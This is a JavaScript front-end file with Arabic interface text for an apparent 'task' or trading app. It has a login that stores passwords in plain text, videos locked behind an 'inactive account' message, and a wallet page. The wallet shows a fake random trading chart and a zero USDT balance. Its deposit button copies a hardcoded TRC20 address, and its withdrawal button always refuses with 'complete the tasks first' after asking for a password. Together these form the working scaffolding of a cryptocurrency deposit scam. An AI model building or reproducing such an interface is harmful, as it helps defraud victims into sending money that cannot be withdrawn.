// App JS: register/login, pages, nav, behaviors
(function(){
  // helpers
  const $ = (sel,ctx=document)=>ctx.querySelector(sel);
  const $$ = (sel,ctx=document)=>Array.from(ctx.querySelectorAll(sel));

  const registerPanel = $('#registerPanel');
  const loginPanel = $('#loginPanel');
  const appShell = $('#appShell');
  const pageContent = $('#pageContent');
  const showLogin = $('#showLogin');
  const showRegister = $('#showRegister');

  // initial view: show register
  function showPanel(name){
    registerPanel.setAttribute('aria-hidden','true');
    loginPanel.setAttribute('aria-hidden','true');
    appShell.setAttribute('aria-hidden','true');
    if(name==='register'){ registerPanel.removeAttribute('aria-hidden'); }
    if(name==='login'){ loginPanel.removeAttribute('aria-hidden'); }
    if(name==='app'){ appShell.removeAttribute('aria-hidden'); }
  }

  showRegister.addEventListener('click', ()=>showPanel('register'));
  showLogin.addEventListener('click', ()=>showPanel('login'));

  // enforce English-only password on input for register
  const regPass = $('#regPass');
  regPass.addEventListener('input', function(){
    // remove Arabic ranges and spaces
    this.value = this.value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\s]/g,'');
  });

  // handle register submit: save to localStorage, then go to login and remove regCode
  $('#registerForm').addEventListener('submit', function(e){
    e.preventDefault();
    const ident = $('#regIdent').value.trim();
    const pass = $('#regPass').value;
    const code = $('#regCode').value;
    if(!ident||!pass||!code){ alert('الرجاء تعبئة كل الحقول'); return; }
    // save account
    const account = {ident,pass};
    localStorage.setItem('gaym_account', JSON.stringify(account));
    // go to login
    alert('تم إنشاء الحساب، سيتم توجيهك إلى صفحة تسجيل الدخول');
    // clear reg fields
    $('#regCode').value='';
    $('#regPass').value='';
    $('#regIdent').value='';
    // show login with code hidden behavior (we already hide in login panel)
    showPanel('login');
  });

  // login submit: check against stored account
  $('#loginForm').addEventListener('submit', function(e){
    e.preventDefault();
    const ident = $('#logIdent').value.trim();
    const pass = $('#logPass').value;
    const stored = JSON.parse(localStorage.getItem('gaym_account')||'null');
    if(!stored || stored.ident!==ident || stored.pass!==pass){ alert('بيانات غير صحيحة'); return; }
    // set session
    localStorage.setItem('gaym_session', JSON.stringify({ident}));
    showPanel('app');
    loadPage('home');
  });

  // bottom nav
  const navBtns = $$('.nav-icon');
  navBtns.forEach(b=>b.addEventListener('click', ()=>{ const t=b.dataset.target; loadPage(t); }));

  function loadPage(name){
    if(name==='home'){
      pageContent.innerHTML = homeTemplate();
      startCarousel();
    }else if(name==='videos'){
      pageContent.innerHTML = videosTemplate();
      attachVideoHandlers();
    }else if(name==='wallet'){
      pageContent.innerHTML = walletTemplate();
      attachWalletHandlers();
    }
  }

  // templates
  function homeTemplate(){
    return `\n      <div class="page">\n        <h2>الرئيسية</h2>\n        <div class="carousel" id="carousel">\n          <div class="slide" style="background-image:url('/assets/slide1.jpg')"></div>\n          <div class="slide" style="background-image:url('/assets/slide2.jpg')"></div>\n          <div class="slide" style="background-image:url('/assets/slide3.jpg')"></div>\n          <div class="slide" style="background-image:url('/assets/slide4.jpg')"></div>\n          <div class="slide" style="background-image:url('/assets/slide5.jpg')"></div>\n        </div>\n      </div>`;
  }

  function videosTemplate(){
    let html = `<div class="page"><h2>مقاطع الفيديو</h2><div class="vlist">`;
    for(let i=1;i<=14;i++){
      html += `<div class="vcard" data-id="v${i}"><div class="thumb">فيديو ${i}</div><div class="lock">🔒</div></div>`;
    }
    html += `</div></div>`;
    return html;
  }

  function walletTemplate(){
    return `\n      <div class="page">\n        <h2>المحفظة والتداول</h2>\n        <div class="wallet-card">\n          رصيد الحساب: <div style="font-size:20px;margin-top:6px">0.00 USDT</div>\n          <div style="font-size:12px;opacity:0.9;margin-top:6px">شبكة: TRC20</div>\n        </div>\n        <div class="trade-box" id="tradeBox">\n          <!-- simple animated bars -->\n          <canvas id="tradeChart" width="600" height="140" style="width:100%;height:140px"></canvas>\n        </div>\n        <div style="margin-top:12px;display:flex;gap:8px;justify-content:flex-end">\n          <button id="depositBtn" class="copy-btn">شحن (Deposit)</button>\n        </div>\n      </div>`;
  }

  // carousel
  let carouselInterval;
  function startCarousel(){
    const el = $('#carousel');
    if(!el) return;
    let idx=0; const slides = el.querySelectorAll('.slide');
    function show(i){ el.scrollTo({left: i*el.clientWidth, behavior:'smooth'}); }
    clearInterval(carouselInterval);
    carouselInterval = setInterval(()=>{ idx=(idx+1)%slides.length; show(idx); },3000);
    // responsive on resize
    window.addEventListener('resize', ()=>{ show(idx); });
  }

  function attachVideoHandlers(){
    $$('.vcard').forEach(v=>v.addEventListener('click', ()=>{ alert('عذراً، حسابك غير فعال'); }));
  }

  function attachWalletHandlers(){
    const depositBtn = $('#depositBtn');
    depositBtn.addEventListener('click', ()=>{
      const addr = 'THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP';
      navigator.clipboard && navigator.clipboard.writeText ? navigator.clipboard.writeText(addr).then(()=>alert('تم نسخ عنوان المحفظة')) : prompt('انسخ العنوان:',addr);
    });
    startTradeChart();
  }

  // trade chart simple animation
  function startTradeChart(){
    const c = $('#tradeChart'); if(!c) return; const ctx=c.getContext('2d'); let w=c.width, h=c.height; function draw(){ ctx.clearRect(0,0,w,h); const bars=50; const bw=w/bars; for(let i=0;i<bars;i++){ const val=Math.abs(Math.sin((Date.now()/600)+(i/4))*h*0.45); const up=Math.random()>0.5; ctx.fillStyle=up? 'rgba(16,185,129,0.9)':'rgba(239,68,68,0.9)'; ctx.fillRect(i*bw, h-val, bw*0.8, val); } requestAnimationFrame(draw);} draw();
  }

  // account footer and withdrawal
  function showAccountFooter(){
    const s = JSON.parse(localStorage.getItem('gaym_session')||'null');
    if(!s) return;
    let footer = document.querySelector('.account-footer');
    if(!footer){ footer = document.createElement('div'); footer.className='account-footer'; footer.innerHTML = `\n      <div>متصل كـ: <strong>${escapeHtml(s.ident)}</strong></div>\n      <div class="withdraw-form">\n        <input id="wdCompany" placeholder="اسم الشركة" />\n        <input id="wdPass" type="password" placeholder="كلمة السر" />\n        <div style=\"text-align:right\"><button id="wdBtn" class=\"withdraw-btn\">سحب الرصيد</button></div>\n      </div>`; document.body.appendChild(footer);
      document.getElementById('wdBtn').addEventListener('click', ()=>{ alert('عذراً، ليس لديك رصيد كافٍ، يرجى إكمال المهمات أولاً'); });
    }
  }

  function escapeHtml(s){ return String(s).replace(/[&<>"]+/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]; }); }

  // on load, if session exists, show app
  document.addEventListener('DOMContentLoaded', ()=>{
    const session = JSON.parse(localStorage.getItem('gaym_session')||'null');
    if(session){ showPanel('app'); loadPage('home'); showAccountFooter(); }
    else showPanel('register');
  });

})();
